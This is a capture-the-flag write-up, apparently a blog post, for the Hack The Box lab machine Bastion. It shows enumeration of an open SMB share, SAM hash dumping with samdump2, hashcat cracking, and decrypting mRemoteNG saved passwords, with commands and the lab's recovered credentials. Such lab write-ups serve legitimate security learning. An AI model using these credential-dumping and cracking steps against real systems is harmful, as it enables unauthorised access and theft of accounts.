+++
title = "Hack The Box: Bastion"
date = "2019-09-06"
author = ""
tags = ["HTB", "SMB", "SAM", "John", "mRemoteNG"]
keywords = ["", ""]
description = ""
showFullContent = false
cover = "/img/bastion/info_card.png"
images = ["/img/bastion/info_card.png"]
+++


# Summary

Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access. 

# Enumeration

I start with this nmap command to quickly find open ports.
```sh
nmap -sS -p- --min-rate=1000 10.10.10.134

Nmap scan report for 10.10.10.134
Host is up (0.23s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

Then run a thorough service scan on the discovered ports.

```sh
nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134

Nmap scan report for 10.10.10.134
Host is up (0.22s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-06T13:28:45+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-06 12:28:49
|_  start_date: 2019-09-06 11:58:13

```
## SMB

Based on the open ports the best service to check out first is smb.

```sh
smbmap -H 10.10.10.134 -u ' '

[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.134...
[+] IP: 10.10.10.134:445        Name: 10.10.10.134
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
```
After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.

Since this is a windows machine I will switch to my windows vm to make my work easier.

{{< image src="/img/bastion/backup_share.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

<br>

Contents of note.txt

*Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.*

Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.

{{< image src="/img/bastion/backup_share_2.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

<br>

On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.

{{< image src="/img/bastion/backup_share_3.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.

I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.

{{< image src="/img/bastion/backup_share_4.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

##### Now to get the credentials!

I pulled the 2 files back to my kali box and using samdump2 I got the user hash.

```sh
samdump2 SYSTEM SAM

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
I then cracked the NTLM hash for L4mpje using hashcat and got the password.

```sh
hashcat -m 1000 -a 0 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force

26112010952d963c8dc4217daec986d9:bureaulampje
```
# Exploitation

Now that I have a username and password I can login through ssh.

{{< image src="/img/bastion/bastion_5.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

Now that user is owned, let's try to escalate privileges to admin.

I switched to powershell and started looking at installed programs. mRemoteNG isn't a default windows application so let me look into it and if it can help in privesc.

{{< image src="/img/bastion/bastion_6.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

<br>

According to their website:

*mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.*

I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don't need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.

The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.

{{< image src="/img/bastion/bastion_7.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

I was able to find a script on github to decrypt the password.

```sh
./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==

Password: thXLHM96BeKL0ER2
```
I can finally login as administrator and own system!

{{< image src="/img/bastion/bastion_8.png" alt="backup share" position="center" style="border-radius: 8px;" >}}

# References

- [mremoteng_decrypt.py](https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py)
- [mremote metasploit module](https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/)
